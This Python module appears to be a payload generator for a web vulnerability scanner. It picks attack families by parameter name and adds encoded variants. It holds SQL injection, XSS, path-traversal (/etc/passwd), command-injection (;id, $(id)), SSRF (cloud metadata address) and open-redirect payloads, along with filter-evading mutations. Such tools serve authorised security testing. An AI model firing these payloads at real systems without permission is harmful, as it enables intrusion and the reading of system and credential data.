from __future__ import annotations

from typing import List
from urllib.parse import quote


BASE_PAYLOADS = {
    "sql_injection": [
        "'",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "1' AND SLEEP(5)--",
        "\" OR \"1\"=\"1",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2fetc%2fpasswd",
    ],
    "command_injection": [
        ";id",
        "|whoami",
        "&&whoami",
        "$(id)",
        "`id`",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80/",
        "http://localhost:8080/",
    ],
    "open_redirect": [
        "https://evil.example",
        "//evil.example",
    ],
}


def _priority_families(param_name: str) -> List[str]:
    name = param_name.lower()
    families: List[str] = []
    if any(k in name for k in ("id", "user", "name", "q", "search", "query")):
        families.extend(["sql_injection", "xss"])
    if any(k in name for k in ("file", "path", "template", "page")):
        families.append("path_traversal")
    if any(k in name for k in ("cmd", "exec", "shell", "ping")):
        families.append("command_injection")
    if any(k in name for k in ("url", "uri", "link", "redirect", "next", "callback")):
        families.extend(["ssrf", "open_redirect"])
    if not families:
        families.extend(["sql_injection", "xss", "path_traversal"])
    return list(dict.fromkeys(families))


def _mutate(payload: str) -> List[str]:
    variants = [payload, quote(payload, safe=""), quote(quote(payload, safe=""), safe="")]
    lower = payload.lower()
    if "<script>" in lower:
        variants.append("<ScRiPt>alert(1)</ScRiPt>")
    if "'" in payload:
        variants.append(payload.replace("'", "''"))
    return list(dict.fromkeys(variants))


def build_payloads(param_name: str, max_payloads: int) -> List[str]:
    families = _priority_families(param_name)
    payloads: List[str] = []
    for family in families:
        for base in BASE_PAYLOADS.get(family, []):
            payloads.extend(_mutate(base))

    # Add a few cross-family payloads for coverage.
    payloads.extend(_mutate("' OR 1=1--"))
    payloads.extend(_mutate("<img src=x onerror=alert(1)>"))
    payloads.extend(_mutate("../../../etc/passwd"))

    deduped = list(dict.fromkeys(payloads))
    return deduped[: max(1, max_payloads)]

